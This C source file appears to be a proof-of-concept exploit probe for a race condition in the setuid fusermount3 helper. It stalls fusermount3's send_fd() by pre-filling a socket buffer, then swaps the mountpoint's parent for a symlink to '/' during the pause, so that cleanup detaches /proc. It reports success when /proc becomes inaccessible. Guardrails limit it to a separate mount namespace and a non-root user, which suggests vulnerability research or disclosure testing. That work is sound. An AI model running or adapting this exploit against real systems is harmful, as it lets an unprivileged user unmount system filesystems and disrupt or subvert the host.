/*
 * End-to-end fusermount3 chain probe.
 *
 * This invokes the real /usr/bin/fusermount3 with an inherited _FUSE_COMMFD,
 * watches /proc/self/mountinfo for the FUSE mount event, races the mountpoint
 * parent to a symlink to "/", and checks whether /proc was actually detached
 * by fusermount3's cleanup path.
 *
 * The default path uses a connected socketpair with a full send buffer and a
 * short SO_SNDTIMEO. This makes real send_fd() block after the real mount,
 * gives the PoC time to swap the path, then makes send_fd() fail naturally.
 *
 * Guardrails:
 * - requires POC_ALLOW_REAL_FUSERMOUNT=mount-namespace-only
 * - requires POC_PARENT_MNT_NS and refuses to run in that namespace
 * - requires non-root real uid, so setuid fusermount3 is exercised
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

#define MAX_ATTEMPTS 3
#define CHILD_EXIT_TIMEOUT_MS 5000
#define SEND_TIMEOUT_MS 250

static long long usec_since(const struct timespec *start)
{
	struct timespec now;

	clock_gettime(CLOCK_MONOTONIC, &now);
	return (now.tv_sec - start->tv_sec) * 1000000LL +
	       (now.tv_nsec - start->tv_nsec) / 1000LL;
}

static int read_ns_link(const char *path, char *buf, size_t size)
{
	ssize_t len = readlink(path, buf, size - 1);

	if (len < 0)
		return -1;
	buf[len] = '\0';
	return 0;
}

static void guard_or_die(void)
{
	const char *allow = getenv("POC_ALLOW_REAL_FUSERMOUNT");
	const char *parent_ns = getenv("POC_PARENT_MNT_NS");
	char self_ns[128];

	if (allow == NULL || strcmp(allow, "mount-namespace-only") != 0) {
		fprintf(stderr, "[guard] missing POC_ALLOW_REAL_FUSERMOUNT=mount-namespace-only\n");
		exit(2);
	}

	if (parent_ns == NULL || parent_ns[0] == '\0') {
		fprintf(stderr, "[guard] missing POC_PARENT_MNT_NS\n");
		exit(2);
	}

	if (read_ns_link("/proc/self/ns/mnt", self_ns, sizeof(self_ns)) != 0) {
		perror("[guard] readlink /proc/self/ns/mnt");
		exit(2);
	}

	if (strcmp(parent_ns, self_ns) == 0) {
		fprintf(stderr, "[guard] refusing: current mount namespace matches parent (%s)\n",
			self_ns);
		exit(2);
	}

	if (getuid() == 0) {
		fprintf(stderr, "[guard] refusing: probe must run as non-root to exercise setuid fusermount3\n");
		exit(2);
	}

	printf("[guard] parent mount namespace: %s\n", parent_ns);
	printf("[guard] probe mount namespace:  %s\n", self_ns);
	printf("[guard] uid=%ld euid=%ld\n", (long)getuid(), (long)geteuid());
}

static int mkdir_checked(const char *path, mode_t mode)
{
	if (mkdir(path, mode) == 0)
		return 0;
	if (errno == EEXIST)
		return 0;
	fprintf(stderr, "[setup] mkdir %s failed: %s\n", path, strerror(errno));
	return -1;
}

static int setup_paths(char *root, size_t root_sz, char *base, size_t base_sz,
		       char *target, size_t target_sz, char *moved, size_t moved_sz)
{
	char tmpl[] = "/tmp/fusermount-real-chain.XXXXXX";
	char *dir = mkdtemp(tmpl);

	if (dir == NULL) {
		perror("[setup] mkdtemp");
		return -1;
	}

	snprintf(root, root_sz, "%s", dir);
	snprintf(base, base_sz, "%s/x", root);
	snprintf(target, target_sz, "%s/proc", base);
	snprintf(moved, moved_sz, "%s_moved", base);

	if (mkdir_checked(base, 0700) != 0 || mkdir_checked(target, 0700) != 0)
		return -1;

	return 0;
}

static void cleanup_paths(const char *root, const char *base, const char *target,
			  const char *moved)
{
	struct stat st;

	if (lstat(base, &st) == 0 && S_ISLNK(st.st_mode))
		unlink(base);

	rename(moved, base);
	rmdir(target);
	rmdir(base);
	rmdir(moved);
	rmdir(root);
}

static int set_cloexec(int fd, int enabled)
{
	int flags;

	flags = fcntl(fd, F_GETFD);
	if (flags < 0)
		return -1;

	if (enabled)
		flags |= FD_CLOEXEC;
	else
		flags &= ~FD_CLOEXEC;

	return fcntl(fd, F_SETFD, flags);
}

static int fill_send_buffer(int fd)
{
	char buf[4096];
	int flags;
	size_t total = 0;

	memset(buf, 'A', sizeof(buf));

	flags = fcntl(fd, F_GETFL);
	if (flags < 0) {
		perror("[setup] F_GETFL");
		return -1;
	}

	if (fcntl(fd, F_SETFL, flags | O_NONBLOCK) != 0) {
		perror("[setup] set O_NONBLOCK");
		return -1;
	}

	for (;;) {
		ssize_t res = send(fd, buf, sizeof(buf), MSG_NOSIGNAL);

		if (res > 0) {
			total += (size_t)res;
			continue;
		}
		if (res < 0 && errno == EINTR)
			continue;
		if (res < 0 && (errno == EAGAIN || errno == EWOULDBLOCK))
			break;

		perror("[setup] fill send buffer");
		(void)fcntl(fd, F_SETFL, flags);
		return -1;
	}

	if (fcntl(fd, F_SETFL, flags) != 0) {
		perror("[setup] restore socket flags");
		return -1;
	}

	printf("[setup] pre-filled _FUSE_COMMFD send buffer with %zu bytes\n",
	       total);
	return 0;
}

static int create_blocked_comm_pair(int *comm_fd, int *peer_fd)
{
	int sv[2];
	int sndbuf = 4096;
	struct timeval timeout = {
		.tv_sec = SEND_TIMEOUT_MS / 1000,
		.tv_usec = (SEND_TIMEOUT_MS % 1000) * 1000,
	};

	if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) {
		perror("[setup] socketpair");
		return -1;
	}

	if (set_cloexec(sv[0], 0) != 0 || set_cloexec(sv[1], 1) != 0) {
		perror("[setup] set FD_CLOEXEC");
		close(sv[0]);
		close(sv[1]);
		return -1;
	}

	(void)setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf,
			 sizeof(sndbuf));
	if (setsockopt(sv[0], SOL_SOCKET, SO_SNDTIMEO, &timeout,
		       sizeof(timeout)) != 0) {
		perror("[setup] SO_SNDTIMEO");
		close(sv[0]);
		close(sv[1]);
		return -1;
	}

	if (fill_send_buffer(sv[0]) != 0) {
		close(sv[0]);
		close(sv[1]);
		return -1;
	}

	*comm_fd = sv[0];
	*peer_fd = sv[1];
	printf("[setup] send_fd() will time out after %d ms if peer does not read\n",
	       SEND_TIMEOUT_MS);
	return 0;
}

static int mount_visible(const char *target)
{
	FILE *fp;
	char line[8192];
	int visible = 0;

	fp = fopen("/proc/self/mountinfo", "r");
	if (fp == NULL)
		return -1;

	while (fgets(line, sizeof(line), fp) != NULL) {
		if (strstr(line, target) != NULL && strstr(line, "fuse") != NULL) {
			visible = 1;
			break;
		}
	}

	fclose(fp);
	return visible;
}

static int proc_is_gone(void)
{
	struct stat st;

	return stat("/proc/self/status", &st) != 0;
}

static int wait_child_timeout(pid_t child, int *status, int timeout_ms)
{
	int elapsed_ms = 0;

	while (elapsed_ms < timeout_ms) {
		pid_t res = waitpid(child, status, WNOHANG);

		if (res == child)
			return 0;
		if (res < 0)
			return -1;

		usleep(10000);
		elapsed_ms += 10;
	}

	kill(child, SIGTERM);
	usleep(100000);
	if (waitpid(child, status, WNOHANG) != child) {
		kill(child, SIGKILL);
		usleep(100000);
		if (waitpid(child, status, WNOHANG) != child)
			return 2;
	}
	return 1;
}

static int attempt_chain(int attempt)
{
	char root[PATH_MAX], base[PATH_MAX], target[PATH_MAX], moved[PATH_MAX];
	char fd_env[64];
	struct timespec start;
	pid_t child;
	int comm_fd = -1, peer_fd = -1;
	int status = 0;
	int saw_mount = 0;
	int swapped = 0;
	long long detect_us = -1, swap_us = -1, exit_us = -1;

	if (setup_paths(root, sizeof(root), base, sizeof(base), target,
			sizeof(target), moved, sizeof(moved)) != 0)
		return -1;

	if (create_blocked_comm_pair(&comm_fd, &peer_fd) != 0) {
		cleanup_paths(root, base, target, moved);
		return -1;
	}

	printf("[attempt %d] target=%s\n", attempt, target);
	clock_gettime(CLOCK_MONOTONIC, &start);

	child = fork();
	if (child < 0) {
		perror("[attempt] fork");
		cleanup_paths(root, base, target, moved);
		close(comm_fd);
		close(peer_fd);
		return -1;
	}

	if (child == 0) {
		close(peer_fd);
		snprintf(fd_env, sizeof(fd_env), "_FUSE_COMMFD=%d", comm_fd);
		putenv(fd_env);
		execl("/usr/bin/fusermount3", "fusermount3", target, (char *)NULL);
		perror("[child] execl fusermount3");
		_exit(127);
	}

	close(comm_fd);
	comm_fd = -1;

	for (;;) {
		int visible;
		pid_t child_res;
		long long elapsed_us = usec_since(&start);

		if (elapsed_us > 5000000LL)
			break;

		visible = mount_visible(target);
		if (visible > 0) {
			saw_mount = 1;
			detect_us = elapsed_us;
			break;
		}

		child_res = waitpid(child, &status, WNOHANG);
		if (child_res == child) {
			printf("[attempt %d] fusermount3 exited before mount was visible; status=%d\n",
			       attempt, status);
			close(peer_fd);
			cleanup_paths(root, base, target, moved);
			return 1;
		}
		if (child_res < 0) {
			perror("[attempt] waitpid");
			close(peer_fd);
			cleanup_paths(root, base, target, moved);
			return -1;
		}

		usleep(50);
	}

	if (saw_mount) {
		if (rename(base, moved) == 0 && symlink("/", base) == 0) {
			swapped = 1;
			swap_us = usec_since(&start);
			printf("[attempt %d] FUSE mount visible at %lld us; swap completed at %lld us\n",
			       attempt, detect_us, swap_us);
			printf("[attempt %d] holding swapped path until real send_fd() timeout\n",
			       attempt);
		} else {
			printf("[attempt %d] swap failed after mount detection: %s\n",
			       attempt, strerror(errno));
		}
	} else {
		printf("[attempt %d] FUSE mount not visible before timeout\n", attempt);
		kill(child, SIGTERM);
		if (wait_child_timeout(child, &status, 1000) == 2) {
			printf("[attempt %d] fusermount3 did not terminate; aborting probe\n",
			       attempt);
			close(peer_fd);
			cleanup_paths(root, base, target, moved);
			return -2;
		}
		close(peer_fd);
		cleanup_paths(root, base, target, moved);
		return 1;
	}

	{
		int wait_res = wait_child_timeout(child, &status, CHILD_EXIT_TIMEOUT_MS);
		if (wait_res == 2) {
			printf("[attempt %d] fusermount3 did not terminate; aborting probe\n",
			       attempt);
			close(peer_fd);
			cleanup_paths(root, base, target, moved);
			return -2;
		}
		if (wait_res != 0)
			printf("[attempt %d] fusermount3 did not exit before timeout; killed child\n",
			       attempt);
	}
	exit_us = usec_since(&start);
	printf("[attempt %d] fusermount3 exited after %lld us with status=%d\n",
	       attempt, exit_us, status);

	close(peer_fd);

	if (saw_mount && swapped && proc_is_gone()) {
		printf("[attempt %d] SUCCESS: /proc is inaccessible after real fusermount3 cleanup\n",
		       attempt);
		return 0;
	}

	if (saw_mount && swapped)
		printf("[attempt %d] /proc is still accessible after cleanup\n",
		       attempt);

	cleanup_paths(root, base, target, moved);
	return 1;
}

int main(void)
{
	int attempt;

	guard_or_die();

	if (access("/usr/bin/fusermount3", X_OK) != 0) {
		perror("[setup] /usr/bin/fusermount3");
		return 1;
	}

	for (attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
		int res = attempt_chain(attempt);

		if (res == 0) {
			printf("[result] real_fusermount3_chain=success\n");
			return 0;
		}
		if (res < 0) {
			printf("[result] real_fusermount3_chain=blocked_by_fusermount3_hang\n");
			return 1;
		}
	}

	printf("[result] real_fusermount3_chain=not_proven_after_%d_attempts\n",
	       MAX_ATTEMPTS);
	return 1;
}
